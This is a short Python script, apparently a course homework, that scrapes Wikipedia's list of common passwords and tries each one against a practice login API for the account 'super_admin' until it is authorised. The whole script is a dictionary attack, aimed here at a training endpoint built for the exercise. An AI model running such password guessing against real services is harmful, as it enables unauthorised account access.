import requests
from bs4 import BeautifulSoup


def check_pass(password):
    data = {'login': 'super_admin', 'password': password}
    response_auth_cookie = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework",
                                         data=data).cookies
    response_check_pass = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=response_auth_cookie)

    return response_check_pass.text


page = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")
soup = BeautifulSoup(page.text, "html.parser")
pass_list = soup.get_text('|', strip=True)
start_str = 'SplashData|Rank|2011|[6]|2012|[7]|2013|[8]|2014|[9]|2015|[10]|2016|[5]|2017|[11]|2018|[12]|2019|[13]|1|'
in_start = pass_list.find(start_str)
in_finish = pass_list.find('|[|edit|]|Password manager')
pass_list = pass_list[in_start+len(start_str):in_finish]
pass_list = pass_list.split('|')
pass_list = set(pass_list)

for password in pass_list:
    result = check_pass(password)
    if result == 'You are authorized':
        print(result)
        print(f"Ваш пароль - {password}")
        break

